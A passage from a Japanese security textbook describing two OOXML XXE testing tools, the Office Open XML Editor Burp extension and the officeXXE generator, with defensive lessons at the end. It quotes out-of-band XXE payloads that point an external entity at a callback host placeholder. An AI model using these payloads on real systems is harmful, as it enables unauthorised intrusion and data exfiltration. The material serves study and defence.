## OOXML編集ツール（Burp拡張・生成器）

前節までで、DOCX・XLSX・PPTXといったOOXML（Office Open XML）ファイルの実体が「複数のXMLファイルをZIPアーカイブとして束ねたコンテナ形式」であり、その中の`word/document.xml`や`xl/sharedStrings.xml`、`[Content_Types].xml`などに手を加えることでXXE（XML External Entity, XML外部実体注入）ペイロードを埋め込めることを確認した。しかし、この仕組みを知っていても、実際の検証作業は「ZIPを展開する→対象XMLを編集する→再圧縮する→アップロードする→レスポンスを確認する→ペイロードを変えてまた最初から」という反復作業になりがちで、手作業では非効率かつミスも起きやすい。本節では、この反復作業を支援するために作られた2つのツール、Burp Suite拡張の**Office Open XML Editor**と、ペイロード付きファイルを生成するスクリプト**officeXXE**を取り上げ、それぞれの仕組みと、防御側がこれらのツールの挙動から何を学ぶべきかを解説する。

### なぜ「編集ツール」が必要になるのか：OOXMLの構造的な制約

まず前提を整理する。OOXMLファイルは中身がZIPアーカイブであるため、そのままではテキストエディタで開いて編集できない。プロキシツール（Burp SuiteやOWASP ZAPなど、ブラウザとサーバの間に立ってHTTPリクエスト/レスポンスを閲覧・改ざんする中間者的ツール）は本来、テキストベースのHTTPボディを対象に作られており、バイナリであるZIP（＝OOXML）のペイロードを直接いじる機能は持っていない。そのため、素朴にXXEを検証しようとすると次のような手順が必要になる。

1. Wordなどで空のdocxファイルを作成する
2. `unzip`コマンド等でZIPを展開する
3. `word/document.xml`をテキストエディタで開き、`<!DOCTYPE>`宣言とXXEペイロードを挿入する
4. 再度ZIPとして圧縮し直す（このとき圧縮方式やファイル構造を壊さないよう注意が必要）
5. できあがったファイルをアプリケーションにアップロードする
6. 結果を確認し、ペイロードを変えたい場合は手順2からやり直す

この「毎回ZIPを作り直す」という手間そのものが、ペイロードのバリエーションを素早く試すうえでの大きなボトルネックになる。Office Open XML EditorとofficeXXEは、それぞれ異なるアプローチでこのボトルネックを解消しようとしたツールである。

### Office Open XML Editor（PortSwigger Burp拡張）

#### 概要と位置づけ

Office Open XML Editorは、PortSwiggerが公開しているBurp Suite用の拡張機能（Extension）であり、Python 2.7で実装されている。公式リポジトリの説明では次のように紹介されている。

> "Office Open XML Editor is a burp extension written in Python 2.7 that will allow you to edit Office Open XML(OOXML) file directly in Burp Suite."

> 出典: PortSwigger/office-open-xml-editor — https://github.com/PortSwigger/office-open-xml-editor

この一文が示す本質は、「Burp Proxy/Repeaterの画面の中でOOXMLファイルを直接編集できるようにする」という点にある。前述の「展開→編集→再圧縮→送信」というサイクルを、Burpのタブ切り替えだけで完結させることを狙っている。

#### 動作の仕組み：CustomTabとマルチパート検出

Burp拡張には、Message Editor（リクエスト/レスポンスの表示・編集領域）に独自のタブを追加できるAPI（`IMessageEditorTabFactory`）が用意されている。本拡張はこのAPIを使い、次のロジックでタブを出現させる。

1. リクエストが**マルチパートPOSTリクエスト**（`multipart/form-data`形式で、ファイルアップロードなどに使われる複数パートを含むHTTPリクエスト）であるかを判定する
2. マルチパートの各パートのContent-Typeを調べ、設定ファイルに登録されたOOXML系のMIMEタイプと一致するかを確認する
3. 一致すれば、「Open Office XML」タブをMessage Editorに追加し、パート内のバイナリ（＝ZIPとしてのOOXMLファイル）をその場で展開してXMLをテキスト表示する
4. ユーザーがタブ内でXMLを編集して送信すると、拡張が裏側で該当XMLファイルをZIPに書き戻し、マルチパートのボディを差し替えてから実際のHTTPリクエストとして送出する

この「検出→展開→表示→編集→再圧縮→差し替え」という一連の処理をBurpの1リクエスト内で完結させている点が、本ツールの中核的な価値である。判定に使うMIMEタイプや、デフォルトで開くXMLファイル名は、リポジトリに含まれる設定ファイル`conf/conf.json`で管理されている。実際の内容は次の通りである。

```json
{
	"Content-Types": ["application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation"],
	"FileToOpen" : "[Content_Types].xml",
	"tryToFindZip" : true
}
```

> 出典: PortSwigger/office-open-xml-editor（conf/conf.json）— https://github.com/PortSwigger/office-open-xml-editor

この設定が示す仕組みをかみ砕くと以下の通りである。

- `Content-Types`配列は、Word（`wordprocessingml.document`＝docx）、Excel（`spreadsheetml.sheet`＝xlsx）、PowerPoint（`presentationml.presentation`＝pptx）に対応する公式MIMEタイプを列挙しており、リクエストのパートがこのいずれかに一致した場合にタブが有効化される。逆に言えば、アプリケーション側がこれら以外の独自Content-Type（例えば単に`application/octet-stream`）を使っている場合はそのままでは検出されず、`conf.json`を編集してMIMEタイプを追加する必要がある。
- `FileToOpen`は、タブを開いたときに**デフォルトでどのXMLファイルを表示するか**を指定する。デフォルトは`[Content_Types].xml`（OOXMLのZIP内でファイル種別のマッピングを定義するメタデータファイル）になっているが、実際にXXEを仕込みたいのは`word/document.xml`や`xl/sharedStrings.xml`であることが多いため、検証時にはこの値をターゲットに合わせて書き換える運用になる。
- `tryToFindZip`は、渡されたバイナリの中からZIPシグネチャ（ZIPファイルの先頭に現れる`PK`のマジックバイト）を探索して、パート内にZIPが埋め込まれているかを自動判定させるフラグである。マルチパートのバイナリ部分の先頭にHTTPやフォーム関連の余分なバイトが混じっていても、ZIP構造の開始位置を見つけ出そうとする救済策として働く。

#### Burp Collaboratorとの連携によるOut-of-Band検証

本拡張自体はペイロードを自動生成するわけではなく、あくまで「編集を容易にするエディタ」である。したがって実務では、タブ内でXMLを手動編集し、次のようなOut-of-Band（帯域外、レスポンスに直接結果が出ない代わりに外部への通信を観測して脆弱性を確認する手法）型のペイロードを仕込む使い方が想定されている。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe">
  %remote;
]>
```

ここで`BURP-COLLABORATOR-SUBDOMAIN`の部分に、Burp Collaborator（攻撃者が制御する一意なサブドメインへのDNS/HTTP通信を検知するOASTインフラ）が発行する一意のサブドメインを挿入する。サーバ側のXMLパーサが外部実体解決を許してしまっていれば、パーサはこのURLへHTTPリクエストを送信しようとし、その通信がCollaboratorに記録される。レスポンスに何も変化が表れないブラインドな状況でも、この通信の有無だけで脆弱性の存在を判定できる。Burp拡張としてCollaboratorクライアントとシームレスに連携できる点は、単体のスクリプトツールにはない利点である。

#### 制限事項：Intruderでは使えない

本拡張の既知の制限として、Burp IntruderでOOXMLタブが使えないという点が挙げられる。これはBurp拡張API側の制約に起因するもので、IntruderのCustomTab機構がMessage EditorのタブAPIと完全に同一のインターフェースを提供していないためである。したがって、複数のペイロードバリエーション（例えばコールバックURLだけを変えた多数の亜種）を自動的に総当たりでテストしたい場合、Intruderの自動化機能をそのまま使うことはできず、Repeaterで1件ずつ手動編集するか、後述のofficeXXEのようなスクリプト側で事前にファイルを複数生成してからIntruderの「ファイルアップロード」的な使い方（`§`マーカーでファイル全体を差し替える方式）を組み合わせる、といった工夫が必要になる。

> 出典: PortSwigger/office-open-xml-editor — https://github.com/PortSwigger/office-open-xml-editor

#### バージョンと保守状況について

このリポジトリはPython 2.7を前提として書かれている。Python 2は2020年1月1日に公式サポートが終了しており、Burp Suite自体も拡張のPython実行環境としてJythonを介したPython 2系をサポートしてきた歴史的経緯がある。現行のBurp SuiteはPython拡張の実行にJython（Python 2互換）を必要とする場合が多く、この拡張を動かすには別途Jythonのスタンドアロンjarをダウンロードし、Burpの拡張設定でPython環境として指定する必要がある。長期間更新されていないツールをそのまま使う際は、依存するJythonのバージョンやBurp本体との互換性を検証環境で事前に確認すべきである。

### officeXXE（GigaByteRex製ペイロード生成スクリプト）

#### 概要と位置づけ

officeXXEは、Office Open XML Editorとは対照的に「Burpに依存しない、単体のPythonスクリプトとしてXXEペイロード入りのOfficeファイルを生成するツール」である。README上の説明は簡潔で、"XXE payload generator for office files"（Officeファイル向けXXEペイロード生成器）とされている。

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

用途としては、対象アプリケーションにOOXMLファイルをアップロードさせる機能があり、そこにペイロード入りのdocx/xlsxをそのまま渡して脆弱性の有無を確認したい、という場面を想定している。Burp拡張のようにリアルタイムでリクエストを編集するのではなく、**事前にペイロード入りのファイルを作り置きしておく**という発想のツールである。

#### 使い方：ウィザードモードとCLIオプション

officeXXEは対話的なウィザードモードと、コマンドライン引数を直接指定するモードの両方を提供する。

```
python officeXXE.py
```

と実行すると、ファイル形式や攻撃タイプを質問形式で選ばせるウィザードが起動する。一方、自動化を想定した直接実行では以下のようなオプションを取る。

```
-f, --filetype   1(docx) または 2(xlsx)
-a, --attack      1(payload) または 2(clusterbomb)
-d, --domain      コールバック監視用ドメイン
-o, --output      出力ファイル名
```

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

`clusterbomb`という攻撃タイプ名は、Burp Intruderの攻撃モード名（複数のペイロードリストを総当たりの直積で組み合わせる方式）から借用したものと考えられるが、README・コードの記述からは「計画段階の機能」であり、実際に完全動作するのは`payload`（単一のコールバックURLを埋め込む方式）のみである点に注意が必要である。

#### XXEペイロードテンプレートの中身

スクリプト内の`docx_payload_text`という変数に、あらかじめ用意されたXXEペイロードのテンプレート文字列が格納されている。中身は次のような、教科書的なOut-of-Band型のXXEペイロードである。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "REPLACEME">]>
<foo>&xxe;</foo>
```

> 出典: GigaByteRex/officeXXE（officeXXE.py内 docx_payload_text）— https://github.com/GigaByteRex/officeXXE

このテンプレートの`REPLACEME`という文字列が、CLIで指定した`-d`（ドメイン）オプションの値、すなわち攻撃者が観測するコールバック用URL（例：Burp Collaboratorのサブドメインや、独自に用意したOOB検証用サーバのURL）に置換される。`<!ELEMENT foo ANY>`は「`foo`要素の中身として任意のコンテンツを許可する」というDTDの要素宣言であり、これによって直後の`&xxe;`という実体参照が文法上正しい位置に置けるようになる。`SYSTEM`キーワードは外部実体（external entity）であることを示し、パーサはこのURIへ実際にアクセスを試みる。この構造は本教科書の前節で扱った「外部一般実体によるOut-of-Band XXE」の基本形そのものであり、officeXXEはこの汎用ペイロードを機械的にOOXMLコンテナへ埋め込む「配送役」に徹しているツールだと理解するとよい。

#### 処理フロー：なぜdocxしか実質動かないのか

READMEおよびコードから読み取れる処理の流れは次の通りである。

1. `docx_payload_program()`関数が呼び出され、新規の空docxファイルをテンプレートとして用意する
2. これをZIPとして一時ディレクトリに展開する
3. 展開後の`word/document.xml`を、上記のXXEペイロードテンプレート（コールバックURL埋め込み済み）で**丸ごと上書き**する
4. 展開したファイル一式を再度ZIP圧縮し、指定された出力ファイル名でOOXML（docx）として保存する
5. 一時ファイル・ディレクトリを削除してクリーンアップする

xlsx形式についても同様に`xl/sharedStrings.xml`（Excelにおいて文字列データを一元管理するXML、セルはこのファイルへのインデックス参照として値を持つ）を対象にした処理が用意されているが、README上では開発者自身が「テスト時のXXE発火に成功していない」旨を明言しており、動作するのは事実上docxのみである。

この非対称性が生じる理由を、OOXMLパーサの実装から推測すると次のように整理できる。Word文書ビューア（Microsoft WordやOfficeの各種SDK、あるいはサーバサイドで文書を処理するライブラリ）は`word/document.xml`をほぼそのままの構造でパースして本文として解釈するのに対し、Excelの`sharedStrings.xml`は「共有文字列テーブル」という特殊な役割を持ち、多くのExcel実装がこのファイルの読み込み時に構造検証やキャッシュ機構を独自に挟むことが多い。そのため、単純にファイル全体をDTD付きのXXEペイロードで置き換えるだけでは、Excel側のバリデーションで弾かれたり、そもそも期待される`<sst>`ルート要素などのスキーマから外れて文書自体が壊れたファイル（corrupt）として扱われてしまう可能性がある。README中で開発者が「ボイラープレート（テンプレート全体）を丸ごと上書きするのではなく、既存の正当なXMLの中に最小限のDOCTYPE宣言と実体参照だけを**動的に挿入**する方式に変更すべきだ」という改善方針を述べているのは、まさにこの問題への対処案である。つまり、ファイル全体を壊れた最小限のXMLに差し替えるのではなく、既存の妥当なOOXML構造を保ったまま、DTD宣言だけを注入する方が、より多様な実装で本文としてパースされる可能性が高くなるという考え方である。

#### 保守状況について

READMEでは開発者自身が本ツールを「ダクトテープで保持されているPOC（Proof of Concept、概念実証コード）の状態」と評しており、プルリクエストを歓迎する旨が明記されている。最終更新から時間が経っている場合、依存ライブラリ（Python 2/3のどちらを前提にしているか、`zipfile`や`argparse`のAPI差異など）が現在の実行環境と噛み合わない可能性があるため、利用する際はまずローカルの検証用サンドボックスで実行確認を行うべきである。

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

### 2ツールを比較して見えてくる設計思想の違い

ここまでの内容を整理すると、2つのツールは同じ「OOXML×XXE」というテーマを扱いながら、アプローチが対照的であることが分かる。

| 観点 | Office Open XML Editor | officeXXE |
|---|---|---|
| 実行環境 | Burp Suite拡張（Python 2.7 / Jython） | スタンドアロンPythonスクリプト |
| 主な用途 | 既存のOOXMLファイルをリクエスト送信時にその場で編集 | ペイロード入りOOXMLファイルを事前に生成 |
| OOB検証との連携 | Burp Collaboratorとシームレスに連携可能 | コールバックドメインをCLI引数で指定するのみ（Collaboratorとの直接統合はない） |
| 自動化（Intruder等）との相性 | Intruderでは使用不可という制約あり | 生成したファイルをIntruderのファイル差し替え機能に渡すなど、外部で組み合わせる運用が可能 |
| 対応形式の成熟度 | docx/xlsx/pptxいずれもエディタとして開ける（ペイロードの中身は利用者が用意） | docxのみ実質動作、xlsxは既知の未解決課題 |

この対比から得られる実務上の教訓は、「リアルタイム編集型（Burp拡張）」と「事前生成型（スタンドアロンスクリプト）」という2つのワークフローが、目的に応じて使い分けられるべきだという点である。1つのペイロードをじっくり手動で試行錯誤したい場面ではBurp拡張のインタラクティブ性が有利であり、逆に同一ペイロードを複数のエンドポイントやアカウントに対して繰り返しアップロードするような場面では、事前生成したファイルをスクリプトやIntruderのパイプラインに載せる方が効率的である。

### 防御側の視点：これらのツールの存在から読み取るべきこと

本教科書はあくまで防御目的の解説であるため、最後にこれらのツールの挙動から導かれる防御上の要点を整理しておく。

1. **アップロードされたOOXMLファイルは「信頼できないZIPアーカイブ」として扱う。** Office Open XML Editorがマルチパートのパートを自動検出してZIPとして展開できてしまう、という事実そのものが、OOXMLが実質的に「ZIP＋複数XML」という構造であることを裏付けている。サーバ側でOOXMLを処理する際は、まずファイルシグネチャ・MIMEタイプ・拡張子の整合性を検証したうえで、ZIP展開後の各XMLファイルに対しても個別にXMLパーサの安全設定（外部実体解決の無効化、DTD処理自体の禁止など）を適用する必要がある。単に「拡張子が.docxだから安全」と判断してはならない。
2. **`[Content_Types].xml`や`sharedStrings.xml`など、一見目立たない補助的なXMLファイルも攻撃対象になり得る。** officeXXEが`word/document.xml`を主眼としつつ`sharedStrings.xml`にも手を出そうとしていたように、OOXMLコンテナ内のどのXMLファイルであっても、パーサが安全でない設定で読み込めばXXEの入口になり得る。防御側は「本文相当のXMLだけを守ればよい」という思い込みを捨て、ZIP内の全XMLファイルに対して一律に安全なパーサ設定を適用すべきである。
3. **Out-of-Band（帯域外）検証手法を前提に監視を設計する。** どちらのツールも最終的にはコールバックURL（Collaboratorや自前のOASTサーバ）への通信有無で脆弱性を判定する設計になっている。これは裏を返せば、実運用環境においてもサーバから予期しない外部への送信ネットワーク接続（アウトバウンド通信）が発生していないかを監視することが、XXEの悪用検知・侵入検知の観点で有効な防御策になるということを意味する。ファイアウォールやEDR（Endpoint Detection and Response）でアプリケーションサーバの不要なアウトバウンド通信を制限・監視することは、XXEに限らずSSRF全般に対する多層防御としても機能する。
4. **ツールの存在自体が「反復検証の効率化ニーズ」を示している。** これらのツールが作られた動機は、まさに「手作業でのZIP展開・再圧縮が面倒だから」という点にあった。これは裏返せば、セキュリティ診断側にとってOOXMLへのXXE注入は十分に定型化・自動化可能な作業であることを意味し、防御側は「攻撃には手間がかかるはずだ」という楽観に頼らず、根本的な対策（XMLパーサの安全なデフォルト設定の採用、外部実体解決を無効化したライブラリバージョンの使用）を講じるべきである。
